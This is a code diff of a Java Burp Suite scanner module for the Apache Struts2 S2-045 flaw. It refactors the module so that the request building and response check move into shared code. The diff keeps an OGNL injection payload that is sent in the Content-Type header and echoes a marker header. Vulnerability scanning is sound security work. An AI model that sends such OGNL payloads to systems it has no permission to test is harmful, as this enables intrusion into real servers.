@@ -1,16 +1,12 @@
 package module.java.vul;
 
 import burp.*;
-import module.Util;
 
-import java.io.PrintWriter;
+import java.net.URLEncoder;
 import java.util.Arrays;
 import java.util.List;
 
 public class S2_045 extends IModule {
-    public String randomMark = Util.getRandomString(16);
-    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
-
     public String poc =
             "%{" +
             "#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xxx','"+injectMark[0]+"'+'"+injectMark[1]+"')" +
@@ -42,12 +38,7 @@ public class S2_045 extends IModule {
 
     @Override
     public IScanIssue start() {
-        IHttpService httpService = iHttpRequestResponse.getHttpService();
-        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
-        PrintWriter out = new PrintWriter(callbacks.getStdout(), true);
-
         int bodyOffset = requestInfo.getBodyOffset();
-        byte[] request = iHttpRequestResponse.getRequest();
         byte[] requestBody = Arrays.copyOfRange(request, bodyOffset, request.length);
 
         List<String> headers = requestInfo.getHeaders();
@@ -59,12 +50,8 @@ public class S2_045 extends IModule {
         }
 
         headers.add("Content-Type: " + poc);
-        byte[] newRequest = helpers.buildHttpMessage(headers, requestBody);
-        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
-        byte[] response = newHttpRequestResponse.getResponse();
-        String responseText = helpers.bytesToString(response);
-        if (responseText.contains(randomMark)) {
-            this.iHttpRequestResponse = newHttpRequestResponse;
+        request = helpers.buildHttpMessage(headers, requestBody);
+        if (check()) {
             this.detail = exp;
             return creatCustomScanIssue();
         }
